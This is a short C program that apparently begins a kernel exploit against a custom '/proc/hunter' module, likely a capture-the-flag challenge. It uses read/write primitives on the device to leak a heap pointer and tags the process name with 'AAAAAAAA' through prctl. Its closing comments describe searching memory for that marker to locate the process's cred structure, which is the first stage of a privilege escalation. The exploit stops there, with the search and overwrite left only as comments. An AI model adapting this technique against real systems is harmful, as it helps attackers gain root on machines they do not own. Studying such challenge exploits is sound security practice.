#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <sys/prctl.h>
#include <stdlib.h>

int fd;

// Some helper functions to read/write values
long read_p() {
	long res;
	read(fd, &res, 8);
	return res;
}

void set_p(long p) {
	char b[9];
	b[0] = 's';
	*(long*)&b[1] = p;
	write(fd, b, 9);
}

void write_p(long v) {
	char b[9];
	b[0] = 'w';
	*(long*)&b[1] = v;
	write(fd, b, 9);
}

int main()
{
	fd = open("/proc/hunter", O_RDWR);
	set_p(0);
	long heap = read_p();
	printf("heap: %p\n", heap);
	prctl(PR_SET_NAME, "AAAAAAAA", 0, 0, 0);
	//now search for 0x4141414141414141 in memory
	//cred struct pointer will be at that address - 16
	return 0;
}
